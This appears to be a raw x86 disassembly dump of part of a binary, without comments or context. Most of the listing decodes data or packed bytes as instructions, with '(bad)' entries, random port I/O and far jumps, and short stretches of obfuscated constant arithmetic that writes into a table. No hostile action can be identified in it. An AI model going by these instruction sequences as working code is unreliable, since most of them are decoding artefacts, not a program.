  4108da:	fild   WORD PTR [ebx]
  4108dc:	push   cs
  4108dd:	es push 0xf697e32e
  4108e3:	mov    esi,0x8a116de1
  4108e8:	add    dl,bh
  4108ea:	inc    esp
  4108eb:	sbb    eax,0xc6846537
  4108f0:	shl    DWORD PTR [ecx],1
  4108f2:	add    al,0x88
  4108f4:	loop   0x410904
  4108f6:	jle    0x41087b
  4108f8:	out    dx,eax
  4108f9:	push   0x2e
  4108fb:	mov    eax,ds:0xb5fa8627
  410900:	out    dx,eax
  410901:	xor    bl,BYTE PTR [esi]
  410903:	jle    0x4108e3
  410905:	cld    
  410906:	push   ebp
  410907:	mov    esi,0xb29fd042
  41090c:	jne    0x410921
  41090e:	mov    ebx,0x92aa0ae5
  410913:	adc    al,0xb
  410915:	cmc    
  410916:	mov    ss,WORD PTR [ecx+0x5b4b566a]
  41091c:	jecxz  0x4108fa
  41091e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41091f:	in     al,dx
  410920:	pushf  
  410921:	fild   QWORD PTR [eax+0x33]
  410924:	test   DWORD PTR ds:0x3eafa935,0xc12acd2e
  41092e:	stc    
  41092f:	std    
  410930:	sub    eax,ebp
  410932:	repz (bad) 
  410934:	in     al,dx
  410935:	fnstenv [eax-0xd3d52de]
  41093b:	or     al,BYTE PTR [edx+0x54]
  41093e:	cs std 
  410940:	xor    DWORD PTR [eax+eax*8+0x51a3ea66],edi
  410947:	push   edi
  410948:	xor    ch,BYTE PTR [ebx+0x11]
  41094b:	lods   eax,DWORD PTR ds:[esi]
  41094c:	xor    dh,0x2e
  41094f:	sbb    eax,0x288d73bd
  410954:	lahf   
  410955:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410956:	dec    edi
  410957:	test   al,0xbb
  410959:	loop   0x41091e
  41095b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41095c:	sbb    BYTE PTR [edi+0x70fbd54c],dh
  410962:	test   BYTE PTR [esi-0x19],bh
  410965:	outs   dx,DWORD PTR ds:[esi]
  410967:	out    0x4c,al
  410969:	sub    eax,0xdbf108bd
  41096e:	mov    ebx,0xfe62b51f
  410973:	loope  0x41093c
  410975:	dec    esi
  410976:	inc    eax
  410977:	aad    0x80
  410979:	loop   0x4109f4
  41097b:	stos   DWORD PTR es:[di],eax
  41097d:	fs xchg esi,ecx
  410980:	mov    esi,0x76b221d3
  410985:	adc    al,0x1b
  410987:	push   ss
  410988:	push   cs
  410989:	jg     0x410972
  41098b:	mov    bl,0x94
  41098d:	cmp    ch,BYTE PTR [ebp-0x6e]
  410990:	scas   eax,DWORD PTR es:[edi]
  410991:	mov    ch,0x63
  410993:	dec    ebx
  410994:	(bad)  
  410995:	and    dh,ch
  410997:	ret    
  410998:	int3   
  410999:	cmp    esi,esi
  41099b:	xchg   ebx,eax
  41099c:	sub    ebx,0x16ef0989
  4109a2:	clc    
  4109a3:	out    dx,al
  4109a4:	(bad)  
  4109a5:	into   
  4109a6:	call   0x706a4adb
  4109ab:	(bad)  
  4109ac:	lahf   
  4109ad:	out    dx,al
  4109ae:	int    0xeb
  4109b0:	xchg   esp,eax
  4109b1:	shl    esi,cl
  4109b3:	ss pop ebp
  4109b5:	sbb    al,0x4a
  4109b7:	dec    ebx
  4109b8:	adc    eax,0xc40d2431
  4109bd:	pop    eax
  4109be:	add    BYTE PTR [eax],al
  4109c0:	xor    edx,0x7a7a
  4109c6:	xor    eax,0x5278
  4109cb:	push   edx
  4109cc:	push   eax
  4109cd:	call   0x422046
  4109d2:	mov    DWORD PTR [esi],eax
  4109d4:	mov    DWORD PTR [ebp-0x20],0x3354
  4109db:	mov    DWORD PTR [ebp-0x1c],0x7d8c
  4109e2:	mov    DWORD PTR [ebp-0x18],0x3d36
  4109e9:	mov    DWORD PTR [ebp-0x14],0x51ef
  4109f0:	xor    edi,edi
  4109f2:	mov    DWORD PTR [ebp-0xc],0x3358
  4109f9:	push   0xc9f
  4109fe:	inc    edi
  4109ff:	mov    DWORD PTR [ebp-0x4],edi
  410a02:	mov    eax,DWORD PTR [ebp-0x18]
  410a05:	mov    ecx,DWORD PTR [ebp-0x14]
  410a08:	push   0x1c19
  410a0d:	push   ecx
  410a0e:	push   eax
  410a0f:	call   0x416c20
  410a14:	mov    ecx,DWORD PTR [ebp-0x20]
  410a17:	mov    ebx,DWORD PTR [ebp-0x1c]
  410a1a:	or     eax,ecx
  410a1c:	or     edx,ebx
  410a1e:	push   0x20fa
  410a23:	add    eax,0x7fac
  410a28:	push   0x1cd48ab
  410a2d:	adc    edx,0x133b
  410a33:	push   edx
  410a34:	push   eax
  410a35:	call   0x422046
  410a3a:	mov    ebx,DWORD PTR [ebp-0x4]
  410a3d:	lea    ecx,[eax-0x5d40]
  410a43:	xor    edx,edx
  410a45:	mov    eax,0x16c2
  410a4a:	div    ebx
  410a4c:	mov    edx,DWORD PTR [ebp-0xc]
  410a4f:	sub    eax,edx
  410a51:	mov    DWORD PTR [esi+eax*4+0x725c],ecx
  410a58:	mov    DWORD PTR [ebp-0x14],0x6af0
  410a5f:	jmp    0x410d3f
  410a64:	jno    0x410a88
  410a66:	xchg   DWORD PTR [esi+0x1a20b23a],esi
  410a6c:	mul    DWORD PTR [edx-0x6d]
  410a6f:	mov    esp,0xbca9d38e
  410a74:	jmp    0x1814:0x9a181888
  410a7b:	sbb    BYTE PTR [eax+0x37e14cf6],ch
  410a81:	jge    0x410aef
  410a83:	cs fs pop eax
  410a86:	push   ebx
  410a87:	jmp    0x2e94:0x2cba7392
  410a8e:	arpl   di,cx
  410a90:	mov    eax,ds:0xe9ecd463
  410a95:	pushf  
  410a96:	mov    ds:0x2027cf38,al
  410a9b:	neg    DWORD PTR [ebp-0x79812dc3]
  410aa1:	cdq    
  410aa2:	jl     0x410a9d
  410aa4:	inc    ebx
  410aa5:	(bad)  
  410aa6:	pop    ecx
  410aa7:	add    eax,0x18ce33f
  410aac:	outs   dx,DWORD PTR ds:[esi]
  410aad:	and    esi,ecx
  410aaf:	mov    BYTE PTR [edx-0x41bedd4c],bh
  410ab5:	and    bh,dl
  410ab7:	and    eax,0x5b5f2770
  410abc:	jne    0x410aa6
  410abe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410abf:	inc    ecx
  410ac0:	push   esi
  410ac1:	out    dx,eax
  410ac2:	xor    DWORD PTR [esi+esi*8+0x24f6572a],ebp
  410ac9:	dec    esp
  410aca:	sub    DWORD PTR [eax-0x25],edx
  410acd:	push   0x813eb48c
  410ad2:	xchg   cl,bl
  410ad4:	dec    eax
  410ad5:	iret   
  410ad6:	ds (bad) 
  410ad8:	dec    esp
  410ad9:	retf   0x269f
  410adc:	mov    ebp,0x50f221ed
  410ae1:	cmp    eax,0xc563ad07
  410ae6:	cmp    ecx,DWORD PTR [eax+0x5221c64c]
  410aec:	in     eax,0xdb
  410aee:	push   esi
  410aef:	push   ebp
  410af0:	stos   BYTE PTR es:[di],al
  410af2:	push   DWORD PTR [ebp+0x69]
  410af5:	outs   dx,DWORD PTR ds:[esi]
  410af6:	fstp   QWORD PTR [ebx+0x5b14daf7]
  410afc:	adc    DWORD PTR [ebx],esi
  410afe:	inc    esi
  410aff:	stos   DWORD PTR es:[edi],eax
  410b00:	into   
  410b01:	mov    bh,0xa8
  410b03:	leave  
  410b04:	xchg   edx,eax
  410b05:	dec    BYTE PTR [edx]
  410b07:	fcmovnbe st,st(2)
  410b09:	imul   eax,DWORD PTR es:[edx+edx*4+0x65],0x3b92a79a
  410b12:	repnz test BYTE PTR [esi-0x1e426c0d],bh
  410b19:	sub    BYTE PTR [ebx-0xef171ba],bl
  410b1f:	scas   eax,DWORD PTR es:[edi]
  410b20:	pop    ecx
  410b21:	inc    ebx
  410b22:	ret    
  410b23:	push   ebp
  410b24:	adc    dl,BYTE PTR [edi-0x5f]
  410b27:	pop    edi
  410b28:	sub    BYTE PTR [ebx],ch
  410b2a:	fidiv  WORD PTR [edi+esi*4-0x28]
  410b2e:	cwde   
  410b2f:	pop    es
  410b30:	mov    edi,0x5167db23
  410b35:	idiv   ebx
  410b37:	pop    edi
  410b38:	pop    es
  410b39:	sbb    bh,BYTE PTR [ebx-0x27]
  410b3c:	stos   DWORD PTR es:[edi],eax
  410b3d:	jns    0x410b25
  410b3f:	cs inc ebx
  410b41:	pop    edx
  410b42:	adc    bl,al
  410b44:	xor    esi,esi
  410b46:	ret    
  410b47:	mov    ds:0x3337d0fb,eax
  410b4c:	jno    0x410b68
  410b4e:	lea    ebx,[edx-0x5e9f30c0]
  410b54:	jmp    0x742cf222
  410b59:	dec    ebx
  410b5a:	sub    eax,0x1dc3a405
  410b5f:	mov    cl,0x4e
  410b61:	xor    eax,0xa2c6d683
  410b66:	fadd   st(3),st
  410b68:	cmp    edi,DWORD PTR [edi-0x263e9442]
  410b6e:	sar    DWORD PTR [esi-0x32],0x18
  410b72:	xchg   esp,eax
  410b73:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410b74:	scas   eax,DWORD PTR es:[edi]
  410b75:	addr16 sbb edx,eax
  410b78:	xchg   DWORD PTR [edx+edi*1-0x3a],esp
  410b7c:	and    edi,DWORD PTR [eax+0x1c]
  410b7f:	sub    ecx,DWORD PTR [ebp-0xa25e820]
  410b85:	rcl    dl,0x4e
  410b88:	daa    
  410b89:	(bad)  
  410b8a:	in     al,dx
  410b8b:	inc    ebp
  410b8c:	repnz dec ecx
  410b8e:	xchg   ebp,eax
  410b8f:	sahf   
  410b90:	shl    BYTE PTR ds:0x363b678a,cl
  410b96:	mov    cl,0x10
  410b98:	pop    ds
  410b99:	pop    edx
  410b9a:	cmp    cl,BYTE PTR [ecx]
  410b9c:	adc    cl,BYTE PTR [ebp-0x12d5cb2]
  410ba2:	inc    eax
  410ba3:	aad    0x36
  410ba5:	dec    edi
  410ba6:	cmp    BYTE PTR [esi-0x503c53d7],cl
  410bac:	fsubp  st(5),st
  410bae:	xchg   esi,eax
  410baf:	ds mov cx,0xf619
  410bb4:	push   ds
  410bb5:	cwde   
  410bb6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410bb7:	mov    bh,0x6a
  410bb9:	adc    dl,dl
  410bbb:	cmp    al,0x7a
  410bbd:	or     DWORD PTR ds:0x26af7550,edx
  410bc3:	test   ecx,esi
  410bc5:	lods   eax,DWORD PTR ds:[esi]
  410bc6:	je     0x410b67
  410bc8:	(bad)  
  410bca:	retf   0xafeb
  410bcd:	ficom  DWORD PTR [eax+0xe]
  410bd0:	jnp    0x410c3d
  410bd2:	popf   
  410bd3:	sbb    eax,DWORD PTR [edi-0xa]
  410bd6:	pop    eax
  410bd7:	in     al,dx
  410bd8:	push   esp
  410bd9:	cmp    edx,esi
  410bdb:	dec    edx
  410bdc:	test   BYTE PTR [esi+0x62],0x53
  410be0:	int3   
  410be1:	sbb    esp,DWORD PTR [ecx]
  410be3:	popa   
  410be4:	sub    ecx,esi
  410be6:	mov    ds:0xe7ace5d0,al
  410beb:	sbb    al,0x71
  410bed:	jge    0x410c5c
  410bef:	inc    ecx
  410bf0:	jecxz  0x410b87
  410bf2:	stc    
  410bf3:	sub    al,0x57
  410bf5:	push   esi
  410bf6:	in     eax,dx
  410bf7:	dec    ebp
  410bf8:	fistp  WORD PTR [ebx+0x54]
  410bfb:	xchg   esi,eax
  410bfc:	lock inc ecx
  410bfe:	push   edx
  410bff:	lods   eax,DWORD PTR ds:[esi]
  410c00:	mov    dh,0x85
  410c02:	push   eax
  410c03:	mov    al,0xf7
  410c05:	jns    0x410bde
  410c07:	pop    edx
  410c08:	cld    
  410c09:	xchg   ebp,eax
  410c0a:	lds    esp,FWORD PTR [ecx-0x36]
  410c0d:	add    DWORD PTR [eax-0xe],ebx
  410c10:	aas    
  410c11:	jl     0x410c5b
  410c13:	mov    al,dl
  410c15:	add    DWORD PTR [edx-0x70],ecx
  410c18:	fisttp WORD PTR [esi]
  410c1a:	push   esp
  410c1b:	cs ins DWORD PTR es:[edi],dx
  410c1d:	mov    dh,0x85
  410c1f:	push   0x345cfabb
  410c24:	fidiv  DWORD PTR [edi-0x5068c0e6]
  410c2a:	mov    cl,0x15
  410c2c:	ret    0x9962
  410c2f:	lds    edx,FWORD PTR [edi+0x370cbd6d]
  410c35:	sbb    ecx,DWORD PTR ds:0x1aaf44c5
  410c3b:	loopne 0x410c9e
  410c3d:	xchg   esi,eax
  410c3e:	fidivr WORD PTR [edx+0x63]
  410c41:	mov    ch,0x47
  410c43:	rol    edi,0xc8
  410c46:	out    0x19,eax
  410c48:	js     0x410bd3
  410c4a:	out    dx,eax
  410c4b:	mov    edx,0xa32fbb37
  410c50:	adc    DWORD PTR [ebp+0x5df3993b],edi
  410c56:	push   0xfffffff8
  410c58:	clc    
  410c59:	mov    bl,0x49
  410c5b:	add    dl,BYTE PTR [esi-0x388f26a3]
  410c61:	mov    WORD PTR [ecx],gs
  410c63:	mov    edx,0x67b5adb6
  410c68:	inc    ecx
  410c69:	xchg   esp,eax
  410c6a:	shl    BYTE PTR [edx+ebx*1+0x68],1
  410c6e:	call   0x18c:0x2575d856
  410c75:	cli    
  410c76:	inc    ecx
  410c77:	sub    eax,0xfd2832a9
  410c7c:	call   0x3e92:0x526cd54
  410c83:	mov    ecx,0xf7d3766d
  410c88:	dec    ebp
  410c89:	loop   0x410c38
  410c8b:	nop
  410c8c:	lds    ebx,FWORD PTR [edx+0x48a2f2c3]
  410c92:	sahf   
  410c93:	sbb    eax,ecx
  410c95:	mov    ch,0xde
  410c97:	inc    esp
  410c98:	stos   DWORD PTR es:[edi],eax
  410c99:	test   al,0x55
  410c9b:	jg     0x410cc0
  410c9d:	pop    ebp
  410c9e:	loope  0x410cac
  410ca0:	xchg   esp,eax
  410ca1:	pop    edx
  410ca2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410ca3:	pop    edi
  410ca4:	add    al,0xf2
  410ca6:	mov    ah,0x49
  410ca8:	leave  
  410ca9:	pusha  
  410caa:	mov    cs,edx
  410cac:	lods   eax,DWORD PTR ds:[esi]
  410cad:	retf   0xf852
  410cb0:	aad    0x40
  410cb2:	and    al,0x94
  410cb4:	inc    edx
  410cb5:	lahf   
  410cb6:	add    eax,DWORD PTR [esi]
  410cb8:	in     al,dx
  410cb9:	xor    eax,0x8081fd24
  410cbe:	stc    
  410cbf:	test   esp,ebx
  410cc1:	mov    edx,0x8ce69281
  410cc6:	jmp    0xdc80:0x687f8f17
  410ccd:	adc    ch,BYTE PTR ds:0x60e80a39
  410cd3:	cmp    ch,BYTE PTR [eax-0x1f]
  410cd6:	adc    ecx,edx
  410cd8:	xchg   ecx,eax
  410cd9:	ja     0x410c8d
  410cdb:	jle    0x410c89
  410cdd:	cld    
  410cde:	dec    esp
  410cdf:	popf   
  410ce0:	and    al,0x34
  410ce2:	daa    
  410ce3:	sahf   
  410ce4:	xor    edi,DWORD PTR [eax]
  410ce6:	mov    al,ds:0x93ce4845
  410ceb:	in     al,0x98
  410ced:	add    BYTE PTR ds:0xdba4ed09,al
  410cf3:	sbb    eax,0x2fb9bb9d
  410cf8:	outs   dx,DWORD PTR ds:[esi]
  410cf9:	lea    ebx,[edi]
  410cfb:	sbb    ebx,edx
  410cfd:	popf   
  410cfe:	(bad)  
  410cff:	je     0x410d09
  410d01:	push   ss
  410d02:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410d03:	cli    
  410d04:	nop
  410d05:	pop    ecx
  410d06:	inc    edi
  410d07:	jbe    0x410cfb
  410d09:	or     esp,ebp
  410d0b:	mov    dl,0x72
  410d0d:	icebp  
  410d0e:	je     0x410d07
  410d10:	mov    edx,DWORD PTR [ebx+0x34]
  410d13:	adc    ecx,DWORD PTR [esp+ebp*2+0x7e]
  410d17:	dec    ebx
  410d18:	out    dx,eax
  410d19:	mov    bh,0x8f
  410d1b:	cmc    
  410d1c:	fild   WORD PTR [esi+0x6f]
  410d1f:	std    
  410d20:	pop    eax
  410d21:	inc    esp
  410d22:	(bad)  
  410d23:	fmul   DWORD PTR [ebx]
  410d25:	xchg   edi,eax
  410d26:	out    dx,eax
  410d27:	mov    ds:0x5f2caa61,eax
  410d2c:	mov    WORD PTR [esi-0x68ac9185],cs
  410d32:	(bad)  
  410d33:	xor    al,0xd8
  410d35:	das    
  410d36:	jmp    0x410da5
  410d38:	popf   
  410d39:	mov    DWORD PTR [ebp+esi*8-0x767abc97],ebx
  410d40:	jge    0x410d3e
  410d42:	mov    DWORD PTR [ebp-0xc],0x2c8a
  410d49:	mov    ecx,DWORD PTR [ebp-0xc]
  410d4c:	mov    eax,0x4401
  410d51:	sub    eax,ecx
  410d53:	jmp    0x411033
  410d58:	test   eax,0x82368522
  410d5d:	mov    ss:0x6b32522,al
  410d63:	push   0x3b
  410d65:	inc    ecx
  410d66:	dec    ebp
  410d67:	jle    0x410dd6
  410d69:	sbb    BYTE PTR [eax],0x18
  410d6c:	call   0xdabb:0xf6181814
  410d73:	div    DWORD PTR [edi]
  410d75:	sahf   
  410d76:	cwde   
  410d77:	lods   eax,DWORD PTR ds:[esi]
  410d78:	ds retf 
  410d7a:	inc    esp
  410d7b:	shr    DWORD PTR ds:0xa8f28470,cl
  410d81:	daa    
  410d82:	push   edx
  410d83:	stos   DWORD PTR es:[edi],eax
  410d84:	jl     0x410d79
  410d86:	cs loope 0x410d67
  410d89:	sahf   
  410d8a:	pop    esp
  410d8b:	leave  
  410d8c:	clc    
  410d8d:	cld    
  410d8e:	add    ebx,DWORD PTR [ecx]
  410d90:	xor    BYTE PTR [eax+0xd389e59],bh
  410d96:	dec    ebx
  410d97:	test   al,0xf5
  410d99:	jp     0x410de0
  410d9b:	pusha  
  410d9c:	dec    esi
  410d9d:	pop    ebp
  410d9e:	in     eax,0xc0
  410da0:	xlat   BYTE PTR ds:[ebx]
  410da1:	mov    ebx,DWORD PTR [esi]
  410da3:	and    DWORD PTR [eax],esi
  410da5:	xchg   BYTE PTR [ebx],cl
  410da7:	jmp    0x7e96:0x3b173467
  410dae:	jge    0x410dac
  410db0:	bswap  eax
  410db2:	or     DWORD PTR [esi-0x61],0xc7cfeba9
  410db9:	push   0xfffffffc
  410dbb:	aam    0x24
  410dbd:	jmp    0x43a2:0x67a6f2a7
  410dc4:	sbb    BYTE PTR [ebx+ecx*4-0x134fbfb9],cl
  410dcb:	and    DWORD PTR [edi],edx
  410dcd:	push   0xffffff80
  410dcf:	clc    
  410dd0:	push   cs
  410dd1:	cmp    al,0xe2
  410dd3:	ror    DWORD PTR ss:[edi],0x83
  410dd7:	add    BYTE PTR [eax+edi*8],ch
  410dda:	cmc    
  410ddb:	jge    0x410e5c
  410ddd:	mov    WORD PTR [esi+0x7566bc3a],?
  410de3:	pushf  
  410de4:	pop    ebp
  410de5:	dec    ebx
  410de6:	or     eax,0x879e81fd
  410deb:	(bad)  
  410dec:	pusha  
  410ded:	fld    TBYTE PTR [esi+0x675eb947]
  410df3:	cld    
  410df4:	iret   
  410df5:	pop    edx
  410df6:	cmp    ebx,DWORD PTR [edi-0x320e8623]
  410dfc:	ror    DWORD PTR [ebx+0x4a],0xfe
  410e00:	popf   
  410e01:	add    ecx,DWORD PTR [ebx+0x73]
  410e04:	or     BYTE PTR [ecx-0x1c],ch
  410e07:	retf   
  410e08:	and    DWORD PTR [esi+esi*1+0x4f],ebx
  410e0c:	xchg   ebx,eax
  410e0d:	or     ecx,ebx
  410e0f:	lea    ebx,[bx+di]
  410e12:	fsub   QWORD PTR [edx+0x7f7cfc7f]
  410e18:	sub    eax,0xa7798702
  410e1d:	and    eax,0x5229ca18
  410e22:	and    eax,0xba51b04c
  410e27:	retf   0x41c3
  410e2a:	jnp    0x410e3f
  410e2c:	rcl    DWORD PTR [esi+0x4e],cl
  410e2f:	pop    esi
  410e30:	arpl   WORD PTR [ebx+0x1b33c920],si
  410e36:	mov    bh,0x74
  410e38:	xor    BYTE PTR [eax],bh
  410e3a:	jb     0x410de1
  410e3c:	xchg   ecx,eax
  410e3d:	lea    eax,[edi]
  410e3f:	cwde   
  410e40:	and    ecx,DWORD PTR [edi]
  410e42:	je     0x410e56
  410e44:	inc    esp
  410e45:	add    ebx,DWORD PTR [eax+0x289960bb]
  410e4b:	fstp   QWORD PTR [eax]
  410e4d:	cwde   
  410e4e:	sub    al,0xc0
  410e50:	dec    esi
  410e51:	and    al,0xb3
  410e53:	xor    eax,0xecc5b947
  410e58:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410e59:	mov    edx,0x87e0b75f
  410e5e:	out    0x23,eax
  410e60:	mov    ah,0x58
  410e62:	push   esp
  410e63:	pop    ecx
  410e64:	jne    0x410e62
  410e66:	push   edi
  410e67:	leave  
  410e68:	ret    
  410e69:	daa    
  410e6a:	xchg   DWORD PTR [ebp-0x1e],eax
  410e6d:	mov    ecx,0x77950567
  410e72:	fidivr WORD PTR [ecx+0xf63e5e3]
  410e78:	rcr    BYTE PTR [edx+0x79755770],0xa1
  410e7f:	push   ebp
  410e80:	(bad)  
  410e81:	(bad)  
  410e82:	jae    0x410e3b
  410e84:	(bad)  
  410e85:	and    ebp,ebp
  410e87:	and    ah,BYTE PTR [ebx-0xe985b8e]
  410e8d:	sbb    ah,dh
  410e8f:	fild   QWORD PTR [esi-0x1952333c]
  410e95:	or     ch,BYTE PTR [edi+0x23]
  410e98:	(bad)
  410e9b:	repz das 
  410e9d:	pop    edx
  410e9e:	mov    ds:0xf0ebcdc6,al
  410ea3:	fisub  WORD PTR [ecx+0x129d9d6a]
  410ea9:	push   eax
  410eaa:	adc    al,0xe4
  410eac:	push   ebp
  410ead:	adc    DWORD PTR [edx],ebx
  410eaf:	scas   eax,DWORD PTR es:[edi]
  410eb0:	inc    edx
  410eb1:	jbe    0x410e79
  410eb3:	push   0x30
  410eb5:	lahf   
  410eb6:	push   ss
  410eb7:	ss jg  0x410e49
  410eba:	pop    es
  410ebb:	xchg   ecx,eax
  410ebc:	rol    DWORD PTR [ebx+0x31a10369],cl
  410ec2:	mov    cl,0xc5
  410ec4:	xchg   ebp,eax
  410ec5:	xor    eax,0xe3c45f6c
  410eca:	enter  0x9484,0xa3
  410ece:	push   eax
  410ecf:	loopne 0x410ed9
  410ed1:	and    BYTE PTR [edi-0xebc9f8c],0x8b
  410ed8:	out    0xcc,eax
  410eda:	add    BYTE PTR [edi+0x6],dh
  410edd:	hlt    
  410ede:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410edf:	push   edi
  410ee0:	adc    ah,BYTE PTR [esi-0x8]
  410ee3:	sbb    ah,BYTE PTR [ecx+edx*4+0x43c0c9b9]
  410eea:	fs add eax,0x3c69975a
  410ef0:	jbe    0x410ee7
  410ef2:	sbb    ch,BYTE PTR [ecx+0x10]
  410ef5:	pusha  
  410ef6:	fnsave [esi-0x50]
  410ef9:	nop
  410efa:	aam    0x16
  410efc:	pop    eax
  410efd:	xlat   BYTE PTR ds:[ebx]
  410efe:	jo     0x410f01
  410f00:	cmp    eax,0xb9a8a389
  410f05:	bound  eax,QWORD PTR [ebx-0x6c]
  410f08:	dec    edi
  410f09:	mov    ecx,0x7bd07c52
  410f0e:	add    ecx,DWORD PTR [ebp-0x55]
  410f11:	call   0xcc6f:0xddf45967
  410f18:	mov    WORD PTR [esp+ebx*4+0x543f91d3],?
  410f1f:	retf   
  410f20:	mov    BYTE PTR [ecx],0xc9
  410f23:	mov    eax,0x5527c795
  410f28:	lea    edx,[esi]
  410f2a:	les    esi,FWORD PTR [esp+ebp*8-0x6f6af23e]
  410f31:	out    0x37,eax
  410f33:	mov    ds:0xfacf954b,al
  410f38:	ficomp DWORD PTR [edx+0x7a07f513]
  410f3e:	fcom   QWORD PTR [ebp-0x5d]
  410f41:	mov    dl,0x3
  410f43:	mov    ch,0xb5
  410f45:	cmp    BYTE PTR [esi],dh
  410f47:	jle    0x410f22
  410f49:	div    esp
  410f4b:	adc    edi,DWORD PTR [ebx-0x5e45ff6a]
  410f51:	imul   BYTE PTR [esi+0x22]
  410f54:	jnp    0x410f7c
  410f56:	sub    BYTE PTR [eax+0x5],dl
  410f59:	outs   dx,BYTE PTR ds:[esi]
  410f5a:	pop    ecx
  410f5b:	icebp  
  410f5c:	test   al,0x9a
  410f5e:	daa    
  410f5f:	pop    ebx
  410f60:	cmp    DWORD PTR [edi-0x6b9b26fa],edx
  410f66:	pop    ecx
  410f67:	hlt    
  410f68:	dec    edx
  410f69:	sub    esi,ecx
  410f6b:	lock rcl DWORD PTR [ebp-0x5595d0ab],0x6d
  410f73:	mov    bh,BYTE PTR [ecx+0x29]
  410f76:	ror    DWORD PTR [edi-0x71],0x47
  410f7a:	and    eax,0x5d2ba732
  410f7f:	inc    ebp
  410f80:	xchg   edx,eax
  410f81:	daa    
  410f82:	iret   
  410f83:	into   
  410f84:	inc    ebx
  410f85:	ficomp WORD PTR [ebx]
  410f87:	dec    esi
  410f88:	mov    ch,0xd6
  410f8a:	rol    BYTE PTR [eax+0x38538d2e],1
  410f90:	inc    DWORD PTR [eax+0x36]
  410f93:	jecxz  0x410f9e
  410f95:	imul   esi,DWORD PTR [eax-0x10],0xa2fce8d
  410f9c:	call   0x321b:0x23cbfb8c
  410fa3:	jae    0x411002
  410fa5:	mov    ds:0xc3fac83,al
  410faa:	cmp    dl,BYTE PTR [edi]
  410fac:	js     0x410f65
  410fae:	mov    bl,0x4
  410fb0:	fxtract 
  410fb2:	push   ebp
  410fb3:	lods   eax,DWORD PTR ds:[esi]
  410fb4:	jmp    0x8058:0xc33255dd
  410fbb:	xchg   edx,eax
  410fbc:	mov    dl,bh
  410fbe:	or     BYTE PTR [ecx-0x4e],0x83
  410fc2:	and    esi,DWORD PTR [ebp-0x6b]
  410fc5:	enter  0x2493,0x74
  410fc9:	lahf   
  410fca:	mov    edx,DWORD PTR [ecx]
  410fcc:	xchg   esp,eax
  410fcd:	retf   0x56f
  410fd0:	rol    esp,cl
  410fd2:	cmp    bh,0xf3
  410fd5:	sub    esp,ebp
  410fd7:	and    al,0xdc
  410fd9:	pop    DWORD PTR [edx]
  410fdb:	dec    edx
  410fdc:	ins    DWORD PTR es:[edi],dx
  410fdd:	retf   0x2f4b
  410fe0:	xor    al,0xb
  410fe2:	inc    esp
  410fe3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410fe4:	push   esi
  410fe5:	test   BYTE PTR [ebp-0xb80ed],ch
  410feb:	mov    edx,0x3b3e6cbd
  410ff0:	scas   al,BYTE PTR es:[edi]
  410ff1:	gs scas al,BYTE PTR es:[edi]
  410ff3:	xor    al,0x2b
  410ff5:	neg    DWORD PTR [eax]
  410ff7:	cli    
  410ff8:	cmc    
  410ff9:	(bad)  
  410ffa:	fwait
  410ffb:	ror    BYTE PTR [ebp-0x18],1
  410ffe:	inc    edi
  410fff:	xchg   esi,eax
  411000:	mov    esi,0xbf931684
  411005:	fstp   QWORD PTR [edi-0x29]
  411008:	mov    cl,0xd6
  41100a:	aad    0x5c
  41100c:	in     al,0xa5
  41100e:	aam    0x44
  411010:	adc    eax,0x8548e464
  411015:	call   0x22e8:0x7f2aaa15
  41101c:	fdiv   DWORD PTR [esi+edx*1]
  41101f:	xchg   edi,eax
  411020:	je     0x411066
  411022:	jge    0x410fae
  411024:	cmp    dl,bl
  411026:	cmc    
  411027:	arpl   WORD PTR [edx+0x2d],ax
  41102a:	fcmovne st,st(5)
  41102c:	or     DWORD PTR [ebp+esi*4+0xc],esi
  411030:	inc    eax
  411031:	nop
  411032:	test   BYTE PTR [ebx-0x2dcc03b3],cl
  411038:	div    ecx
  41103a:	mov    ecx,DWORD PTR [ebp-0x14]
  41103d:	xor    eax,0xa80
  411042:	or     eax,0x343b
  411047:	or     eax,ecx
  411049:	mov    ecx,DWORD PTR [ebp+0x8]
  41104c:	mov    DWORD PTR [esi+eax*4-0x1fff4],ecx
  411053:	mov    DWORD PTR [ebp-0xc],0x327f
  41105a:	mov    DWORD PTR [ebp-0x14],0x5215
  411061:	mov    DWORD PTR [ebp+0x8],0x2502
  411068:	mov    eax,DWORD PTR [ebp+0x8]
  41106b:	add    eax,DWORD PTR [ebp-0x14]
  41106e:	mov    ecx,DWORD PTR [ebp-0xc]
  411071:	and    eax,0x2bab
  411076:	lea    eax,[eax+ecx*1-0x557f]
  41107d:	mov    ecx,DWORD PTR [ebp+0xc]
  411080:	mov    DWORD PTR [esi+eax*4],ecx
  411083:	mov    DWORD PTR [ebp-0xc],edi
  411086:	mov    DWORD PTR [ebp+0x8],0x5f40
  41108d:	mov    DWORD PTR [ebp-0x14],0x6ba4
  411094:	mov    DWORD PTR [ebp+0xc],0x7b17
  41109b:	mov    ecx,DWORD PTR [ebp+0x8]
  41109e:	mov    eax,0x43d2
  4110a3:	sub    eax,ecx
  4110a5:	add    eax,DWORD PTR [ebp+0xc]
  4110a8:	xor    edx,edx
  4110aa:	add    eax,DWORD PTR [ebp-0x14]
  4110ad:	mov    ecx,DWORD PTR [ebp-0xc]
  4110b0:	div    ecx
  4110b2:	mov    ecx,DWORD PTR [ebp+0x10]
  4110b5:	xor    edx,edx
  4110b7:	pop    edi
  4110b8:	pop    ebx
  4110b9:	or     eax,0x67ad
  4110be:	mov    DWORD PTR [esi+eax*4-0x3bfa4],ecx
  4110c5:	mov    DWORD PTR [ebp+0x10],0x517b
  4110cc:	mov    DWORD PTR [ebp+0xc],0x5d62
  4110d3:	mov    DWORD PTR [ebp+0x8],0x41b0
  4110da:	mov    ecx,DWORD PTR [ebp+0x8]
  4110dd:	mov    eax,DWORD PTR [ebp+0xc]
  4110e0:	and    ecx,0x68c1
  4110e6:	sub    ecx,0x6fd3
  4110ec:	or     ecx,eax
